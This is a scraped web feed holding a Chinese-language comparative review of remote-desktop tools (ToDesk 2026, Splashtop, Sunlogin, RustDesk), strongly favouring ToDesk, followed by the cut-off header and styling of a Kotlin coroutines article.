<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03625f8f7acd4ef5b3bec5ed748a8274~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=1WDnOrDHrSX9pWM3mmZJ%2FBRmmdQ%3D" alt="" loading="lazy"/></p>
<p>● <strong>向日葵</strong>：拥有深厚用户基础与硬件生态的远程控制软件。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afc7cd5b1de241129b012cac071c18bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=CYvWQpKpS%2FgiKwdIDx8eytn7nkA%3D" alt="" loading="lazy"/></p>
<p>● <strong>Splashtop</strong>：在专业与企业级市场口碑卓著的性能标杆。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/785db57a85494b5190efc6198b117369~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=FRU%2F3S0g1NpGI4gCKqrlDdMiQvE%3D" alt="" loading="lazy"/></p>
<p>● <strong>RustDesk</strong>：开源自建领域的明星，拥有着高度自定义的可能性。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7a0b512f2ea489489889b8085af1567~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=b%2Bja1fYa3DGBfmPTsc1OXn2yXXM%3D" alt="" loading="lazy"/></p>
<p/>
<p/>
<h2 data-id="heading-0"><strong>一、****测评维度一：极限画质与流畅度 </strong></h2>
<p>我们选择在受控端运行开放世界恐怖生存游戏《The Forest》。这款游戏核心体验依赖于昏暗森林的光影变化、快速移动探索的流畅度，以及与野人部落遭遇战时突然的视角转动和战斗操作。这正贴合了远程控制中“高动态画面”和“低操作延迟”两大严苛考验。测试在4K分辨率、高画质预设下进行，重点评估在丛林奔跑、快速转身查看环境等场景下的动态流畅度、暗部细节保留，以及至关重要的“跟手性”。</p>
<p/>
<h3 data-id="heading-1"><strong>ToDesk<strong><strong> 2026新版</strong></strong>本<strong><strong>：刷新认知的“8K360</strong></strong>帧****”技术初体验：</strong></h3>
<p>首先在登录过后，在设置页面UI全面改版，分类更清晰，新手快速上手引导，一键快速调整，自定义优化参数，满足不同场景。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07b07f1ca0284ca39627b439fbae52b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=WZc7xF3bmNLu%2BU%2BywpT%2BnwJrIqc%3D" alt="" loading="lazy"/></p>
<p>不仅如此，新增预设保存功能，可针对特定设备保存画质、分辨率、比例、被控静音、本机播放被控声音等设置，下次自动应用。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1af26dcebd51405d9311ba1c919e9796~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=iAGO%2FzXerwdGYXcNrKkJmAscNEk%3D" alt="" loading="lazy"/></p>
<p>在全部设置好之后，我们开始连接。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/24ad3205f88f4eb0b6174b6e4a119b23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=wd%2BIH2%2B3CTK2ikCNCF921urOtqA%3D" alt="" loading="lazy"/></p>
<p>开启高性能模式或游戏模式，可以将刷新率调制360Hz</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ff8bf0e44df4303805f9c8326e2c83b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=%2Br9lRezp3A2bJp2I5go4qoPUBaA%3D" alt="" loading="lazy"/></p>
<p>设置好之后，我们可以看到延时为3ms，帧率为351fps</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9670ef6c3edb4830abb8891ae49e35c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=n9tIm0XOpymrgEIO4swKD%2BR4cAY%3D" alt="" loading="lazy"/></p>
<p>- <strong>画质与设置优化</strong>：在“原画”模式下，游戏场景的植被纹理、木材细节以及洞穴内的阴影层次都得到了极好的还原，几乎看不到因压缩产生的色块。更关键的是，其新版设置界面分类清晰，并提供了<strong>连接预设功能</strong>。用户可以为家中的游戏电脑单独保存一套包含“超清画质”、“真彩模式（4:4:4色彩采样）”和“极速刷新模式”的配置，下次连接时自动应用，实现了游戏场景的“一键最优设置”。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b083b785a9624bcdb9347824597d9bd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=BuTWF%2FlbKp%2BmTvPYqBRqs4Ib0eM%3D" alt="" loading="lazy"/></p>
<p>- <strong>流畅度与延迟</strong>：开启“极速刷新模式”后，在《The Forest》中快速转身观察周围环境，画面拖影被抑制到极低水平。主观延迟感微弱，操作跟手，达到了可沉浸游玩的级别。这得益于其宣称的端到端<strong>毫秒级响应优化</strong>，以及智能网络引擎在网络良好时自动采用P2P直连，减少中转延迟。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02e4b854e2d14591acaa2b97723102a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=jKmfgHnvtA9xt0mSdFMpkNaFQ%2Fg%3D" alt="" loading="lazy"/></p>
<p>- <strong>技术点睛</strong>：其“鼠标加速通道”功能为FPS游戏提供了高达8000Hz的虚拟回报率，使远程鼠标移动更加平滑跟手。对于《The Forest》这类需要快速精准操作的游戏，这是一个隐性的体验加分项。可以看到游戏过程中始终维持在300fps左右</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3da8276126f4e698be85361a2ad8c65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=mYHZ88qRDP02dNaCH444blvOcdc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2"><strong/></h3>
<h3 data-id="heading-3"><strong>Splashtop：稳健可靠的专家之选</strong></h3>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/563deddcf6454db28f4a56e60adb1c34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=0XxaLIcxe9qIm6ecclpphyjMNuE%3D" alt="" loading="lazy"/></p>
<p>Splashtop在高性能远程访问领域素有口碑，本次测试印证了其稳定性。</p>
<p>- <strong>画质</strong>：画面输出稳定、干净，色彩准确度高，支持4:4:4色彩模式，对于需要色彩保真的专业场景是其强项。在《The Forest》的动态场景中，画质扎实，但在极限快速晃动视角时，能感觉到画面有轻微的动态柔和处理。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9f160b2527b4913952bb97a92ea0046~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=TUl7j9fZ8IUzv9nsLiWsg%2Be7KRc%3D" alt="" loading="lazy"/></p>
<p>- <strong>流畅度与延迟</strong>：表现非常一致，帧率输出平稳。操作延迟略高于ToDesk，但在可接受范围内。其优势在于<strong>卓越的稳定性</strong>，无论场景如何变化，体验波动很小，如同一位可靠的马拉松选手。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce4d85df711d4407ab52f9e76485b06d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=nLyujYS7PCnMotNkMMxlfWiEskQ%3D" alt="" loading="lazy"/></p>
<p>- <strong>综合评价</strong>：如果追求的是稳定、无干扰的远程游戏或工作环境，Splashtop是令人放心的选择。它可能需要用户手动在设置中精细调整以达到最佳游戏性能。</p>
<p/>
<h3 data-id="heading-4"><strong>向日葵：清晰见长，动态优化中</strong></h3>
<p>- <strong>画质</strong>：静态及低速画面清晰，其“真彩模式”也能很好地还原色彩。在《The Forest》的建造界面或静止观察时，画面细节丰富。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c242f1a51e5744cc80d6ee3ac578711f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=Gxx1Njq3I%2B0cD5OTj5HRaxJyfUA%3D" alt="" loading="lazy"/></p>
<p>- <strong>流畅度与延迟</strong>：然而，在战斗时，流畅度会出现可感知的波动，有一种“微顿”感。这与其性能模式的设计逻辑有关：它提供了“游戏优化模式”，允许用户自定义帧率与延迟优化，但实际动态流畅度与顶尖选手仍有差距。其平均延迟在测试中通常高于ToDesk和Splashtop。</p>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" loading="lazy"/></p>
<p/>
<p/>
<h3 data-id="heading-5"><strong>RustDesk：开源可控，性能需调校</strong></h3>
<p>作为开源方案，RustDesk赋予了用户极高的自主权和隐私安全性。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4389c12130e9478785f89bb762fa1fe3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=pK5gJclSSDXUuYA3zGCJcQteWNs%3D" alt="" loading="lazy"/></p>
<p>- <strong>画质与流畅度</strong>：在默认使用公共服务器的条件下，其画面压缩感十分明显，并且在免费的服务器下，常常出现掉线的情况：</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10d6470f10c846e29d8b639cf4c337c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=lzBatWAsYFvnC7t%2F4muVSz8lf8A%3D" alt="" loading="lazy"/></p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b67f990710745ab8342a684e97f8030~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=N%2BCqWlLKFKb58Rk6ZpKZlgYaZZI%3D" alt="" loading="lazy"/></p>
<p>需要自建服务器才能稳定运行。</p>
<p>- <strong>潜力与门槛</strong>：它的性能高度依赖于<strong>自建服务器的质量</strong>。有技术能力的用户通过搭建高性能中继服务器、启用硬件加速编码，可以显著提升体验。但这对普通用户而言门槛较高。</p>
<p/>
<h3 data-id="heading-6"><strong>小结</strong></h3>
<p>在《The Forest》这类融合了探索、建造和突然战斗的游戏中，远程体验的优劣被放大。<strong>ToDesk**** 凭借其底层引擎的激进优化和便捷的场景预设，在高帧率、低延迟的交互体验上建立了显著优势</strong>，最能满足玩家“沉浸式远程游玩”的需求。Splashtop则以强稳定性成为注重可靠性的专业用户和玩家的坚实后盾。向日葵提供了清晰且功能全面的方案，适合大多数非极限竞技的日常游戏场景。而RustDesk，则为特定群体提供了以可控性换取开箱即用体验的独特路径。</p>
<p/>
<p/>
<p/>
<h2 data-id="heading-7"><strong>二、****测评维度二：一对多文件秒传 </strong></h2>
<p/>
<p>文件传输是远程控制最高频的功能之一。但当需要将同一份文件分发给数十、数百台设备时，传统“点对点→断开→重点对点”的模式就变成了效率的黑洞。我们模拟了一个中小型IT团队最典型的运维场景，检验谁能率先解决这一痛点。</p>
<p/>
<h3 data-id="heading-8"><strong>ToDesk<strong><strong> 2026新</strong></strong>版本****：重新定义“批量”操作</strong></h3>
<p>这无疑是ToDesk本次更新中最具杀伤力的功能，没有之一。</p>
<p>● <strong>操作流程</strong>：极其简洁。在ToDesk的设备列表界面，只需点击“快传文件”，便进入一个专门的多设备传输面板。用户像在资源管理器中选择多个文件一样，<strong>轻松勾选需要接收文件的远端设备（支持按分组筛选）</strong>，然后拖入或选择需要发送的文件/文件夹，点击“发送”即可。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43cfaf96073e45c4a10cf4b7fd672189~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=om40CDiHE3ZQLXIib8dgbF4txRA%3D" alt="" loading="lazy"/></p>
<p>● <strong>效率表现</strong>：传输过程中，界面清晰列出所有目标设备，各自显示进度条、传输速度、剩余时间，任何一台中断不影响其他设备。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94af4546c0e149eaa390b9e2c3b15f59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=168k%2BmZuXam7CdltCTK6Sx%2FpwdU%3D" alt="" loading="lazy"/></p>
<p>● <strong>核心价值</strong>：它实现的不仅仅是速度叠加，更是<strong>工作流的根本性重构</strong>。管理员可以从机械的重复操作中解放出来，在文件传输的同时处理其他事务，实现了真正的“批量无人值守运维”。</p>
<p/>
<h3 data-id="heading-9"><strong>向日葵/Splashtop/RustDesk：仍在传统赛道竞速</strong></h3>
<p>这三款软件目前均未提供原生的一对多文件传输功能。</p>
<p>● <strong>操作流程</strong>：用户必须执行三次完整的闭环操作：建立远程连接（或打开文件传输窗口）→找到并选择文件→开始传输→等待完成→断开。这是一个线性、不可并行的时间线。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c37a789ac20e464d8b3c805321d7af98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=Nnl4s%2BoMIkdQK7hDzf6MNZSgozo%3D" alt="" loading="lazy"/></p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc4147810a664998a3864bc3cb94b30f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=L31DT8rC7TkfAvkTvgZMePyeLcw%3D" alt="" loading="lazy"/></p>
<p>● <strong>效率表现</strong>：总耗时基本等于<strong>单次传输耗时的3倍，再加上额外的连接与断开开销</strong>。</p>
<p>● <strong>潜在替代方案</strong>：向日葵和Splashtop的企业版可能通过集成脚本或与第三方设备管理平台配合实现批量分发，但这超出了普通软件功能范畴，增加了复杂性和成本。</p>
<p/>
<h3 data-id="heading-10"><strong>小结：</strong></h3>
<p>在“一对多文件秒传”这个维度上，<strong>ToDesk****完成了一次“降维打击”</strong>。它瞄准的不是传输速度的百分比提升，而是将线性工作流升级为并行工作流，从根本上解决了IT运维、软件部署、内容分发的规模化难题。对于需要管理多台设备（如电竞酒店、学校机房、企业办公区）的用户而言，这是一个具有绝对吸引力的“杀手级”功能，目前其他对手尚无直接竞品。</p>
<p/>
<p/>
<h2 data-id="heading-11"><strong>三、****测评维度三：游戏与应用快捷启动 —— “化繁为简，一步到位”</strong></h2>
<p/>
<p>远程操作的终极便捷，是忘记“远程”本身。我们不应该先“进入一个陌生的桌面”，再像本地一样寻找目标。理想的状态是：我想用家里的电脑玩某款游戏，点击一个图标，游戏就在我公司电脑的屏幕上全屏运行了——中间没有桌面，没有文件夹，只有结果。</p>
<p/>
<h3 data-id="heading-12"><strong>ToDesk****“快捷启动”：深度集成，化身本地启动器</strong></h3>
<p>ToDesk将此功能做到了极致，它不再是一个“远程功能”，而像一个本地的游戏启动平台。</p>
<p/>
<p>● <strong>设置与使用</strong>：在设备列表右键点击受控设备，选择“添加快捷启动”。你可以<strong>直接浏览受控端磁盘，选择.exe可执行文件</strong>（如steam.exe、Photoshop.exe），或更精准地选择游戏主程序。可以自定义名称、图标，并归类到“游戏”、“工作”等自定义面板中。最强大的是，可以<strong>设置启动后自动全屏、自动隐藏<strong><strong>ToDesk</strong></strong>控制栏</strong>。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd35ed712ee946e6b7e9e99f7ba6748b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=a0kzEKlNgb%2BDghc0Lzi22tCTKMk%3D" alt="" loading="lazy"/></p>
<p>● <strong>体验</strong>：点击创建好的《The Forest》快捷方式，几乎感觉不到连接过程，游戏启动器或游戏本体直接在全屏窗口中出现。路径是：点击→（短暂黑屏/连接）→游戏画面。<strong>跳过了“显示远程桌面→找到Steam图标→点击→等待启动”的全过程</strong>。对于固定工作流，效率提升是颠覆性的。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02efd2e3fdf045bd9fa84ff6df730677~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=sS8uzDNvZhJFX%2FMpEde%2BZTjHdsw%3D" alt="" loading="lazy"/></p>
<p>● <strong>自定义面板</strong>：用户可以将不同设备的常用应用、游戏集中在一个面板上，实现跨设备的“一键工作台”，构想非常前瞻。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/818102a77b8b46629cd424ab3e4676ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=tmRA0tFBtJWJm%2BILd3zUdioTyQM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13"><strong>Splashtop/向日葵/RustDesk：功能缺失</strong></h3>
<p>目前版本需先建立完整的桌面控制连接，无快捷启动功能。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c78a9112bcf54b7ab3998c522bb62dbb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=8BaaL4gokMrwjiJQ8PeHzK8eO6c%3D" alt="" loading="lazy"/></p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c20875413f7143838cd3f2a73fc0ed8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc5reh5oWV5r2H:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769509433&amp;x-signature=8DRyBtTYgN8cHFlvgJyZ9TeTHNY%3D" alt="" loading="lazy"/></p>
<p/>
<h3 data-id="heading-14"><strong>小结：</strong></h3>
<p>在“快捷启动”的体验竞赛中，<strong>ToDesk****凭借其深度集成的设计理念和以用户场景为中心的思考，取得了显著领先</strong>。它不仅仅是提供了一个快捷方式，更是重新设计了从意图到结果的交互路径，特别贴合游戏玩家和拥有固定工作流的专业用户需求。</p>
<p/>
<p/>
<p/>
<h2 data-id="heading-15"><strong>四、****总结与选购指南：</strong></h2>
<p>总结一句话：你的场景，决定你的选择</p>
<p>经过三大维度，我们将所有关键发现浓缩为下表，助你一目了然：</p>

































<table><thead><tr><th align="left">功能维度 / 软件</th><th align="left">ToDesk 2026新版</th><th align="left">Splashtop</th><th align="left">向日葵</th><th align="left">RustDesk</th></tr></thead><tbody><tr><td align="left"><strong>极限画质与流畅度</strong> （高帧率游戏/动态场景）</td><td align="left"><strong>优秀</strong> 高帧率模式领先，延迟最低，动态清晰度好</td><td align="left"><strong>良好</strong> 画质扎实稳定，动态稍软，综合体验佳</td><td align="left"><strong>良好</strong> 静态画质优秀，动态流畅度有波动</td><td align="left"><strong>一般</strong> 压缩感较强，高动态下卡顿明显</td></tr><tr><td align="left"><strong>一对多文件秒传</strong> （批量分发效率）</td><td align="left"><strong>优秀****独家核心功能</strong>，并行传输，效率革命性提升</td><td align="left"><strong>不支持</strong> 需手动逐台操作</td><td align="left"><strong>不支持</strong> 需手动逐台操作</td><td align="left"><strong>不支持</strong> 需手动逐台操作</td></tr><tr><td align="left"><strong>游戏/应用快捷启动</strong> （直达目标，减少操作步数）</td><td align="left"><strong>优秀</strong> 深度集成，浏览添加，一键全屏直达，体验最佳</td><td align="left"><strong>不支持</strong> 支持应用快捷方式，对游戏启动器支持一般</td><td align="left"><strong>不支持</strong> 可通过多桌面或CMD实现，有一定学习成本</td><td align="left"><strong>不支持</strong> 需先控制桌面</td></tr></tbody></table>
<h3 data-id="heading-16"><strong/></h3>
<h3 data-id="heading-17"><strong>最终建议：</strong></h3>
<p>从“连通性”到“场景化效率”的时代抉择</p>
<p/>
<p>远程控制软件的市场竞争，已经悄然进入了第二阶段。第一阶段比拼的是“谁能连得上、连得稳”，这个问题在今天已基本得到解决。而第二阶段，正如本次横测所揭示的，<strong>核心是“谁能在特定的深度场景中，提供超越连接本身的效率与体验增值”。</strong></p>
<p/>
<p><strong>ToDesk<strong><strong> 2026新版</strong></strong>本****所展现出的、针对这些痛点的精准创新和卓越实现，使它成为了一个你必须认真考虑、甚至目前看来最具前瞻性的选择</strong>。它或许不是每个细节都完美无瑕，但它正清晰地指向远程控制工具的未来：<strong>更智能、更高效、更无缝地融入我们每一个具体的工作与生活场景。</strong></p>
<p/>
<p>技术服务于人，而最好的服务，是让人忘记技术本身的存在。在这场通往“无形”的竞赛中，领先者已经出发。</p>
<p/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kotlin 协程-基础篇]]></title>    <link>https://juejin.cn/post/7597125475601629211</link>    <guid>https://juejin.cn/post/7597125475601629211</guid>    <pubDate>2026-01-20T10:26:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597125475601629211" data-draft-id="7596874392824873002" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kotlin 协程-基础篇"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-20T10:26:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jony_"/> <meta itemprop="url" content="https://juejin.cn/user/3403743732709767"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kotlin 协程-基础篇
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3403743732709767/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jony_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:26:21.000Z" title="Tue Jan 20 2026 10:26:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 